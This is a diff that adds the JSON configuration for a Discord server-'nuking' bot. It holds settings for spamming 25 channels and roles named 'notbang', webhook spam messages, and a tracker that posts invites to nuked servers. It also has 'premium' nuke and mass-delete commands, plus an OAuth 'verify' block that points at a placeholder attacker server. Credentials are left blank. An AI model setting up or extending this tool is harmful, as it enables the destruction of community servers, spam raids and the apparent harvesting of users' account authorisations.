@@ -1,0 +1,56 @@
+{
+    "guild_id": 0,
+    "owner_ids": [],
+    "top_nuker_channel_id": 0,
+    "top_nuker_guild_channel_webhook": "",
+    "nuke_settings": {
+        "guild_channel_spam_count": 25,
+        "guild_channel_create_data": {
+            "name": "notbang", 
+            "type": 0
+        },
+        "guild_role_spam_count": 25,
+        "guild_role_create_data": {
+            "name": "notbang",
+            "color": 16711680
+        },
+        "guild_channel_webhook_create_data": {
+            "name": "notbang"
+        },
+        "guild_channel_message_data": {
+            "content": "spam"
+        },
+        "tracker_message": "new serv {invite}"
+    },
+    "bot_info": {
+        "nuke": {
+            "client_id": 0,
+            "token": ""
+        },
+        "oauth": {
+            "verify_role_id": 0,
+            "client_id": 0,
+            "client_secret": "",
+            "token": "",
+            "auth_uri": "/auth/discord",
+            "server_uri": "http://IPADRESS:8000"
+        }
+    },
+    "tracker_webhook": "",
+    "premium": {
+        "commands": [
+            "nuke",
+            "delete_channels",
+            "delete_guild_roles",
+            "create_channels",
+            "create_roles"
+        ],
+        "role_id": [
+            "nuke",
+            "delete_channels",
+            "delete_guild_roles",
+            "create_channels",
+            "create_roles"
+        ]
+    }
+}
